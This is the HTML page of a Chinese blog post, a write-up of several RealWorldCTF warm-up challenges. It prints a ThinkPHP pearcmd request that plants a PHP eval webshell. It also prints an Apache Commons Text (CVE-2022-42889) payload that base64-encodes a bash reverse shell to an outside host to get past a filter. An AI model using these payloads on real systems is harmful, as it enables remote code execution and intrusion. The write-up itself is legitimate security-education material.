@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="PwnIO">
+
+
+
+
+
+<title>第五届RealWorldCtf体验赛Writeup | Pwnio.com</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-7E0T45VP3T"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-7E0T45VP3T');
+</script>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Pwnio&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Pwnio&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">第五届RealWorldCtf体验赛Writeup</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">PwnIO</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">2023-01-08&nbsp;&nbsp;21:00:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Tech/">Tech</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="🐑了拼🐑"><a href="#🐑了拼🐑" class="headerlink" title="🐑了拼🐑"></a>🐑了拼🐑</h1><blockquote>
+<p>Score: 46<br>Check-In, difficulty:Baby</p>
+</blockquote>
+<p>签到题，在/assets/index.86036a46.js中直接搜索rwctf，可以找到flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rwctf&#123;wellcome_to_the_rwctf!&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Be-a-Language-Expert"><a href="#Be-a-Language-Expert" class="headerlink" title="Be-a-Language-Expert"></a>Be-a-Language-Expert</h1><blockquote>
+<p>Score: 58<br>Web, difficulty:Baby</p>
+</blockquote>
+<blockquote>
+<p>I heard that there was a vulnerability in ThinkPHP recently, but luckily I set the permissions low and ran it in a docker container, so no one can RCE me.</p>
+</blockquote>
+<p>访问主页，提示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ThinkPHP V6.0.12LTS</span><br></pre></td></tr></table></figure>
+<p>最新的Thinkphp多语言模块RCE漏洞，影响范围：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v6.0.1 &lt; Thinkphp &lt; v6.0.13</span><br><span class="line">Thinkphp v5.0.x</span><br><span class="line">Thinkphp v5.1.x</span><br></pre></td></tr></table></figure>
+
+<p>写文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?+config-create+/&lt;?=eval($_REQUEST[&#x27;a&#x27;])?&gt;+/tmp/hello.php HTTP/1.1</span><br><span class="line">Host: 47.98.124.175:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">think-lang: ../../../../../../../../usr/local/lib/php/pearcmd</span><br><span class="line">Cookie: think_lang=zh-cn</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+<p>执行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /?a=system(&#x27;/readflag&#x27;); HTTP/1.1</span><br><span class="line">Host: 47.98.124.175:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">think-lang: ../../../../../../../../tmp/hello</span><br><span class="line">Cookie: think_lang=zh-cn</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rwctf&#123;PHP_1s_Th3_B3st_L@ngvag3_1n_the_w0r1d&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Evil-MySQL-Server"><a href="#Evil-MySQL-Server" class="headerlink" title="Evil MySQL Server"></a>Evil MySQL Server</h1><blockquote>
+<p>Score: 64<br>Web, difficulty:Normal</p>
+</blockquote>
+<blockquote>
+<p>Please do not connect to an evil mysql server.<br>P.S. flag path: /flag</p>
+</blockquote>
+<p>MySQL的load data local infile特性的安全问题，具体可见：</p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1112/">CSS-T | Mysql Client 任意文件读取攻击链拓展 (seebug.org)</a></p>
+<p>直接使用开源项目，构造一个fake mysql server即可。<br><a target="_blank" rel="noopener" href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a></p>
+<h1 id="Be-a-Famicom-Hacker"><a href="#Be-a-Famicom-Hacker" class="headerlink" title="Be-a-Famicom-Hacker"></a>Be-a-Famicom-Hacker</h1><blockquote>
+<p>Score: 136<br>Misc, difficulty:Schrödinger</p>
+</blockquote>
+<blockquote>
+<p>Contra is a run-and-gun shooter video game developed and published by Konami.You will play as Bill Rizer or Lance Bean to destroy the evil Red Falcon Organization and uncover the true nature of the alien entity controlling them.<br>Please wrap the flag with rwctf{} when submitting.</p>
+</blockquote>
+<p>非常有意思的一道题…<br>题目给了FC游戏魂斗罗（日版）的改版NES文件。<br>找了个FC模拟器玩到通关，看完过关动画，只发现了刚开始选人界面的版权信息被修改了。<br>找了日版原版NES比对了下，发现有4处改动。</p>
+<p><img src="/2023/db1b70afee9d/Contra_nes.png" alt="NES文件比对"><br>猜测Flag估计是藏在第二处改动对应的画面里了。</p>
+<p>最后玩了一天没找到这个画面，觉得不太可能，应该是隐藏的画面，于是去bilibili搜各种彩蛋，最后在一个弹幕里发现：<br><img src="/2023/db1b70afee9d/Contra_bilibili.png" alt="B站弹幕"></p>
+<p>Flag藏在过关动画的隐藏画面里。嗯，作者你真棒。<br><img src="/2023/db1b70afee9d/Contra_flag.png" alt="通关画面"></p>
+<p>顺便总结一下魂斗罗秘籍，感觉童年又完整了。<br><strong>30条命</strong>：开始界面按上上下下左右左右BABA。<br><strong>选关</strong>：开始界面按开始并松开后，同时按住选择键+上+左不放，直到出现选关界面。<br><strong>通关隐藏界面</strong>：通关字幕处，按往选择键+确认键不放，直到出现该界面。</p>
+<h1 id="ApacheCommandText"><a href="#ApacheCommandText" class="headerlink" title="ApacheCommandText"></a>ApacheCommandText</h1><blockquote>
+<p>Score: 77<br>Web, difficulty:Normal</p>
+</blockquote>
+<blockquote>
+<p>Your friend set up a website called “Apache Commons Text Labotoray” with vulnerable version 1.9. In case of being hacked, he adds some restrictions and claims that no one can compromise him. Now, it’s your turn to give him a lesson.</p>
+</blockquote>
+<p>CVE-2022-42889，Apache Commons Text 任意代码执行漏洞，但是做了一些过滤，比如存在script时，会提示“hack! [script, file, url, dns] is not allowed!”，并且第一个${}似乎不能被解析。</p>
+<p>把命令执行放在第二个${}里，套一层base64即可绕过，也就是最终填到靶机的是类似：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;&#125;$&#123;base64Decoder:JHtzY3JpcHQ6amF2YXNjcmlwdDpqYXZhLmxhbmcuUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYygnd2hvYW1pJyl9&#125;</span><br></pre></td></tr></table></figure>
+<p>其中base64那串是类似下面的语句base64后的值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;script:javascript:java.lang.Runtime.getRuntime().exec(&#x27;whoami&#x27;)&#125;</span><br></pre></td></tr></table></figure>
+<p>这里Java的exec如果执行普通的bash反弹，执行不了，可以参考这个文章：<br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ae3922db1f70">https://www.jianshu.com/p/ae3922db1f70</a><br>可以使用：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c $@|bash 0 echo bash -i &gt;&amp; /dev/tcp/1.1.1.1/8000 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>组合后：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;script:javascript:java.lang.Runtime.getRuntime().exec(&#x27;bash -c $@|bash 0 echo bash -i &gt;&amp; /dev/tcp/1.1.1.1/8000 0&gt;&amp;1&#x27;)&#125;</span><br></pre></td></tr></table></figure>
+
+<p>base64后最终payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;&#125;$&#123;base64Decoder:JHtzY3JpcHQ6amF2YXNjcmlwdDpqYXZhLmxhbmcuUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYygnYmFzaCAtYyAkQHxiYXNoIDAgZWNobyBiYXNoIC1pID4mIC9kZXYvdGNwLzEuMS4xLjEvODAwMCAwPiYxJyl9&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rwctf&#123;rwctf_1terat1on_1s_4_g0od_des1gN_e5aa&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Yummy-Api"><a href="#Yummy-Api" class="headerlink" title="Yummy Api"></a>Yummy Api</h1><blockquote>
+<p>Score: 69<br>Web, difficulty:Baby</p>
+</blockquote>
+<blockquote>
+<p>What bad intentions could there be for a yummy api?</p>
+</blockquote>
+<p>YApi &lt; 1.12.0远程命令执行漏洞。<br>可参考：<br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/mrm2goeLNlrIyWCYguEG0A">https://mp.weixin.qq.com/s/mrm2goeLNlrIyWCYguEG0A</a><br><a target="_blank" rel="noopener" href="https://paper.seebug.org/2028/">https://paper.seebug.org/2028/</a></p>
+<p>第一篇文章有暴token和暴uid脚本，第二篇文章有上传逃逸脚本和触发脚本的代码。</p>
+<h1 id="Be-a-PK-LPE-Master"><a href="#Be-a-PK-LPE-Master" class="headerlink" title="Be-a-PK-LPE-Master"></a>Be-a-PK-LPE-Master</h1><blockquote>
+<p>Score: 143<br>Pwn, Misc, difficulty:Baby</p>
+</blockquote>
+<p>pkexec提权漏洞(CVE-2021-4034)，找个脚本，一把梭。<br>供参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41252520/article/details/123030682">https://blog.csdn.net/qq_41252520/article/details/123030682</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rwctf&#123;CVE-2021-4034-PwnKit-is-Awes0me-But-Do-you-know-Handling-argc-0-in-the-kernel&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Be-a-Wiki-Hacker"><a href="#Be-a-Wiki-Hacker" class="headerlink" title="Be-a-Wiki-Hacker"></a>Be-a-Wiki-Hacker</h1><blockquote>
+<p>Score: 61<br>Web, difficulty:Normal</p>
+</blockquote>
+<blockquote>
+<p>Your wiki is my wiki.</p>
+</blockquote>
+<p>CVE-2022-26134: Confluence Pre-Auth Remote Code Execution via OGNL Injection<br>可找个脚本直接一把梭。</p>
+<h1 id="Spring4Shell"><a href="#Spring4Shell" class="headerlink" title="Spring4Shell"></a>Spring4Shell</h1><blockquote>
+<p>Score: 201<br>Web, difficulty:Normal</p>
+</blockquote>
+<blockquote>
+<p>“web”-spring4shell:Sping framework is No.1, can you find some type of leakage and get the shell?</p>
+</blockquote>
+<p>CVE-2022-22965，Spring4Shell漏洞。<br>这边因为只要读取flag，可以直接把文件系统挂到appBase上：</p>
+<p><img src="/2023/db1b70afee9d/spring4shell.png" alt="spring4shell"></p>
+<p>然后去GET /root/flag，即是读/root/flag的文件内容了。</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>PwnIO</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://pwnio.com/2023/db1b70afee9d.html">http://pwnio.com/2023/db1b70afee9d.html</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Tech/"># Tech</a>
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/Writeup/"># Writeup</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2023/c231d3fc3240.html">2022年春秋杯网络安全联赛冬季赛两道有意思的题目</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© PwnIO | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
